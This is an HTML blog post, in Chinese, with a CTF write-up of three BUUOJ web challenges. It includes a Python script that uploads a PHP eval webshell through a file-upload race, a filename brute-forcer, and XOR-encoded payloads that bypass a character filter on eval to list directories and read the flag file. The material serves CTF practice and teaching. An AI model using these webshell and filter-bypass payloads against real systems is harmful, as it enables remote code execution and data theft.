<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>buu23 - Tlife</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tlife"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tlife"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="[RoarCTF 2019]Simple Upload开头源码  &amp;lt;?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller&amp;amp;#123;    public function index()    &amp;amp;#123;        show_source(__FILE__)"><meta property="og:type" content="article"><meta property="og:title" content="buu23"><meta property="og:url" content="http://example.com/2021/07/24/buu23/"><meta property="og:site_name" content="Tlife"><meta property="og:description" content="[RoarCTF 2019]Simple Upload开头源码  &amp;lt;?phpnamespace Home\Controller;use Think\Controller;class IndexController extends Controller&amp;amp;#123;    public function index()    &amp;amp;#123;        show_source(__FILE__)"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210724182401.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725220736.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221932.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221933.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726003819.png"><meta property="article:published_time" content="2021-07-24T08:38:23.000Z"><meta property="article:modified_time" content="2021-07-25T16:39:20.427Z"><meta property="article:author" content="vague huang"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210724182401.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/07/24/buu23/"},"headline":"buu23","image":["https://raw.githubusercontent.com/Hwwg/myphoto/master/20210724182401.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725220736.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221932.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221933.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726003819.png"],"datePublished":"2021-07-24T08:38:23.000Z","dateModified":"2021-07-25T16:39:20.427Z","author":{"@type":"Person","name":"vague huang"},"publisher":{"@type":"Organization","name":"Tlife","logo":{"@type":"ImageObject"}},"description":"[RoarCTF 2019]Simple Upload开头源码  &lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller&amp;#123;    public function index()    &amp;#123;        show_source(__FILE__)"}</script><link rel="canonical" href="http://example.com/2021/07/24/buu23/"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">Tlife</a></div><div class="navbar-menu"><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-07-24T08:38:23.000Z" title="2021/7/24 下午4:38:23">2021-07-24</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-07-25T16:39:20.427Z" title="2021/7/26 上午12:39:20">2021-07-26</time></span></div></div><h1 class="title is-3 is-size-4-mobile">buu23</h1><div class="content"><h2 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h2><p>开头源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $uploadFile = $_FILES[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower($uploadFile[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        $upload = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        $upload-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        $upload-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        $upload-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        $upload-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        $info = $upload-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!$info) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error($upload-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          $url = __ROOT__.substr($upload-&gt;rootPath,<span class="number">1</span>).$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].$info[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;$url,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>尝试了一下其他后缀名上传，发现无法被解析成功，所以看到这个upload()函数，以及对应的防护机制，猜测可以使用条件竞争绕过，写先一下脚本</p>
<p>thinkphp默认上传路径为：<br>/home/index/upload<br>所以有</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/index.php/home/index/upload&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.txt&quot;</span>,<span class="string">&quot;&quot;</span>)&#125;</span><br><span class="line">files1=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&quot;1.php&quot;</span>,<span class="string">&quot;&lt;?php eval($_GET[&#x27;a&#x27;]); ?&gt;)&quot;</span>)&#125;</span><br><span class="line">r=s.post(url,files=files).text</span><br><span class="line">print(r)</span><br><span class="line">r=s.post(url,files=files1).text</span><br><span class="line">print(r)</span><br><span class="line">r=s.post(url,files=files).text</span><br><span class="line">print(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-07-24\&#x2F;60fbd50e4d0f4.txt&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;&quot;,&quot;success&quot;:1&#125;</span><br><span class="line">&#123;&quot;url&quot;:&quot;\&#x2F;Public\&#x2F;Uploads\&#x2F;2021-07-24\&#x2F;60fbd50e61127.txt&quot;,&quot;success&quot;:1&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是去爆破一下这个文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">60fbd50e61127</span><br><span class="line">60fbd50e4d0f4</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://5ff85f06-6397-4b0b-9dc6-362da72c71bb.node4.buuoj.cn/Public/Uploads/2021-07-24/&quot;</span></span><br><span class="line"><span class="comment"># files=&#123;&#x27;file&#x27;:(&quot;1.txt&quot;,&quot;&quot;)&#125;</span></span><br><span class="line"><span class="comment"># files1=&#123;&#x27;file[]&#x27;:(&quot;1.php&quot;,&quot;&lt;?php eval($_GET[&#x27;a&#x27;]); ?&gt;)&quot;)&#125;</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files1).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line"><span class="comment"># r=s.post(url,files=files).text</span></span><br><span class="line"><span class="comment"># print(r)</span></span><br><span class="line">str=<span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str:</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> str:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> str:</span><br><span class="line">                <span class="keyword">for</span> o <span class="keyword">in</span> str:</span><br><span class="line">                    url_fina=url+<span class="string">f&quot;60fbd50e<span class="subst">&#123;i&#125;</span><span class="subst">&#123;j&#125;</span><span class="subst">&#123;f&#125;</span><span class="subst">&#123;k&#125;</span><span class="subst">&#123;o&#125;</span>.php&quot;</span></span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        r=requests.get(url,timeout=<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">except</span>:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">if</span> r.status_code!=<span class="number">404</span>:</span><br><span class="line">                        print(url_fina)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是现在buu的防止太多请求太严了–一直跑不出来</p>
<h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>忘保存了，没了很难受，大概就是照一张256像素一下的图片，然后将图片内容改为这一行因为那两个解析函数的解析方式在这里不同</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210724182401.png" alt="img" style="zoom:67%;">

<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">&#x27;_&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;rosé will not do it&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you are so close, omg&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正则进行匹配过滤，匹配00到空格()的字符，0到9的数字、<code>&quot;$&amp;.,|[&#123;_defgops</code>以及DEL（7f）字符。如果你提交的字符串出现上述字符，die。第二个if表示我们提交的字符串一共不能出现多于13种不同的字符<br>使用此网站可以进行正则匹配的调试<br><a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a><br>所以它允许出现的字符可以如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!#%()*+-&#x2F;:;&lt;&#x3D;&gt;?@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz&#125;~</span><br></pre></td></tr></table></figure>

<p>我们后面的eval肯定是要执行函数的，所以我们可以fuzz一下哪些函数没被过滤，从而来看看有没有实现rce的可能,用php写个脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=get_defined_functions();</span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">&#x27;internal&#x27;</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[\x00- 0-9\&#x27;&quot;\`$&amp;.,|[&#123;_defgops\x7F]+/i&#x27;</span>,$arr))<span class="keyword">continue</span>;</span><br><span class="line">	<span class="keyword">if</span>(strlen(count_chars(strtolower($arr),<span class="number">0x3</span>))&gt;<span class="number">0xd</span>)<span class="keyword">continue</span>;</span><br><span class="line">	var_dump($arr.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是得到的函数却和读取文件啥的没有关系–，所以继续往下看看<br>其实以前也做过很多这种类似题特征是<br>1.过滤了很多字符<br>2.有些运算字符没有被过滤<br>那么这就意味着我们可以通过运算来取字符，比如说^运算然后去构造我们需要的字符<br>payloadtest:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>^%ff%ff%ff%ff%ff%ff%ff)();<span class="comment">//分号和括号是因为这个要放到eval里面执行，是必不可少的语法要求</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725220736.png" alt="image-20210725220736235" style="zoom:67%;">

<p>接下来看看这个配置里面有什么能用的信息不<br>首先disable_function中的函数有很多都被禁了，然后它可以访问的目录也只限制在/html目录下，那么根据以往的经验，大概是要scandir等函数看一下当前目录下的内容了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221932.png" alt="img" style="zoom:67%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210725221933.png" alt="img" style="zoom:67%;"><br>我们构造一下语句然后去找一下字符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print_r(scandir(&#39;.&#39;));</span><br></pre></td></tr></table></figure>

<p>还是之前的那个脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import urllib.parse</span><br><span class="line">find &#x3D; [&#39;p&#39;,&#39;r&#39;,&#39;i&#39;,&#39;_&#39;,&#39;n&#39;,&#39;t&#39;,&#39;s&#39;,&#39;c&#39;,&#39;a&#39;,&#39;d&#39;,&#39;r&#39;,&#39;.&#39;]</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    for j in range(0,256):</span><br><span class="line">        result&#x3D;chr(i^j)</span><br><span class="line">        if(result in find):</span><br><span class="line">            a&#x3D; i.to_bytes(1,byteorder&#x3D;&#39;little&#39;)</span><br><span class="line">            b&#x3D; j.to_bytes(1,byteorder&#x3D;&#39;little&#39;)</span><br><span class="line">            #print(a,b)</span><br><span class="line">            a&#x3D; urllib.parse.quote(a)</span><br><span class="line">            b&#x3D; urllib.parse.quote(b)</span><br><span class="line">            print(&quot;%s:%s^%s&quot;%(result,a,b))</span><br></pre></td></tr></table></figure>

<p>但是这样运算出来的字符我们随便选取就会大于十三个了，要绕过这个，我们就要想想看如何缩减？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<p>其实运用一种套娃的思想即可，这些字符里面的字符肯定可以由其他字符再异或构成的，所以我们这里就将所有异或字符先列出，想在上面的代码进行改编一下，直接一步到位<br>但是我发现似乎不太行。还不如我直接取完再送进去对每个字符重新异或</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result2 = [<span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x91</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8d</span>, <span class="number">0x8c</span>]  <span class="comment"># Original chars,11 total</span></span><br><span class="line">result = [<span class="number">0x9b</span>, <span class="number">0xa0</span>, <span class="number">0x9c</span>, <span class="number">0x8f</span>, <span class="number">0x9e</span>, <span class="number">0xd1</span>, <span class="number">0x96</span>, <span class="number">0x8c</span>]  <span class="comment"># to be deleted</span></span><br><span class="line">temp = []</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> result:</span><br><span class="line">                <span class="keyword">if</span> (a ^ b ^ c == d):</span><br><span class="line">                    <span class="keyword">if</span> a == b == c == d:</span><br><span class="line">                        <span class="keyword">continue</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        print(<span class="string">&quot;a=0x%x,b=0x%x,c=0x%x,d=0x%x&quot;</span> % (a, b, c, d))</span><br><span class="line">                        <span class="keyword">if</span> d <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">                            temp.append(d)</span><br><span class="line">print(len(temp), temp)</span><br></pre></td></tr></table></figure>

<p>对结果进行整理一下，发现：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%9b%9c%9b%9b%9b%9b%9c)^(%9b%8f%9b%9c%9c%9b%8f)^(%8f%9e%96%96%8c%a0%9e)^(%ff%ff%ff%ff%ff%ff%ff))(((%9b%9b%9b%9b%9b%9b%9c)^(%9b%9b%9b%9c%a0%9b%8f)^(%8c%9c%9e%96%a0%96%9e)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210726003819.png" alt="img" style="zoom:67%;">
拿到flag所在文件。最后构造一下，因为flag在最后一个位置，所以可以直接用end进行获取

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/07/26/buu24/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">buu24</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/07/22/buu22/"><span class="level-item">buu22</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">Tlife</a><p class="is-size-7"><span>&copy; 2023 vague huang</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><!--!--><script src="/js/main.js" defer></script><!--!--><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>